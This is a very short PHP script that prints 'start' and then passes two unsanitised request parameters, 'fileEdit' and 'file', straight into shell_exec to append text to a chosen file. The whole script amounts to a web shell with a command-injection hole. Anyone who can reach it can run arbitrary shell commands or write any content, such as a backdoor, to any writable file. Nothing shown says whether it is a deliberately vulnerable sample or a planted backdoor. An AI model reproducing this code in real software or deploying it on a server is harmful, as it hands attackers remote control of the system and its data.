<?php
echo "start";
shell_exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>